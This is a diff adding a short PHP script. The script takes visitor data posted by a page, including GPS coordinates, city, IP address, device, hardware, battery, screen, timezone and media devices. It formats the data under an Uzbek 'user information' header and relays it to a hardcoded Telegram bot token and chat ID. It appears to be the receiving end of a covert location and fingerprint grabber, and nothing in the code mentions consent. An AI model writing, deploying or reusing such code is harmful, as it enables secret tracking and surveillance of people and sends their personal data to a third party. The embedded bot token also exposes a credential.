@@ -1,0 +1,21 @@
+<?php
+$botToken = "8096738475:AAEpARzOs__Qeknja0IU2O6YS9F9vTrw_Fk";
+$chatId = "8108956117";
+
+$data = json_decode(file_get_contents("php://input"), true);
+
+$message = "📊 FOYDALANUVCHI MA'LUMOTI\n";
+$message .= "📍 GPS: ".$data['lat'].", ".$data['lon']."\n";
+$message .= "🌍 Shahar: ".$data['city']."\n";
+$message .= "📡 IP: ".$data['ip']."\n";
+$message .= "📱 Device: ".$data['device']."\n";
+$message .= "🧠 CPU: ".$data['cpu']." cores\n";
+$message .= "💾 RAM: ".$data['ram']." GB\n";
+$message .= "🌐 Internet: ".$data['net']."\n";
+$message .= "🔋 Battery: ".$data['battery']."%\n";
+$message .= "🖥 Screen: ".$data['screen']."\n";
+$message .= "🕒 Timezone: ".$data['time']."\n";
+$message .= "🎧 Media devices: ".$data['media'];
+
+file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message));
+?>
